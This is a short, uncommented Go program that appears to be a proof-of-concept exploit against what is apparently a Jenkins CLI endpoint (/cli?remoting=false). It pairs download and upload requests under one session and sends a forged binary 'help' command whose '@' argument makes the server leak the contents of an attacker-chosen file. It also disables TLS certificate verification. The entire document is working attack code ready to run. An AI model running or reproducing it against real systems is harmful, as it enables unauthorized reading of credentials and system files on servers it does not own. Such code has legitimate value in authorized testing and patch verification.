package main

import (
	"bytes"
	"crypto/tls"
	"errors"
	"github.com/google/uuid"
	"io"
	"log"
	"net/http"
	"os"
	"time"
)

func init() {
	http.DefaultClient.Transport = &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}
}

func main() {
	rootUrl := os.Args[1]
	targetFile := os.Args[2]
	sessionId := uuid.New().String()
	doneChan := make(chan bool)
	log.Println("Starting download request")
	if err := waitForResp(rootUrl, sessionId, doneChan); err != nil {
		panic(err)
	}
	log.Println("Download request pending")
	log.Println("Sending forged command")
	if err := requestFile(rootUrl, targetFile, sessionId); err != nil {
		panic(err)
	}
	<-doneChan
}

func requestFile(rootUrl string, targetFile string, sessionId string) error {
	payload := "\x00\x00\x00\x06\x00\x00\x04help\x00\x00\x00\x0e\x00\x00\x0c@" + targetFile + "\x00\x00\x00\x05\x02\x00\x03GBK\x00\x00\x00\x07\x01\x00\x05en_US\x00\x00\x00\x00\x03"
	req, err := http.NewRequest(http.MethodPost, rootUrl+"/cli?remoting=false", bytes.NewBufferString(payload))
	if err != nil {
		return err
	}
	req.Header.Set("Session", sessionId)
	req.Header.Set("Side", "upload")
	req.Header.Set("Content-Type", "application/octet-stream")
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return err
	}
	if resp.StatusCode != http.StatusOK {
		log.Println(resp.Status)
		return errors.New("upload request error")
	}
	resp.Body.Close()
	return nil
}

func waitForResp(rootUrl string, sessionId string, doneChan chan bool) error {
	req, err := http.NewRequest(http.MethodPost, rootUrl+"/cli?remoting=false", nil)
	if err != nil {
		return err
	}
	req.Header.Set("Session", sessionId)
	req.Header.Set("Side", "download")
	go func() {
		resp, err := http.DefaultClient.Do(req)
		if err != nil {
			panic(err)
		}
		log.Println("request done")
		if resp.StatusCode != http.StatusOK {
			panic(errors.New("download request error"))
		}
		defer resp.Body.Close()
		io.Copy(os.Stdout, resp.Body)
		doneChan <- true
	}()
	time.Sleep(100 * time.Millisecond)
	return nil
}
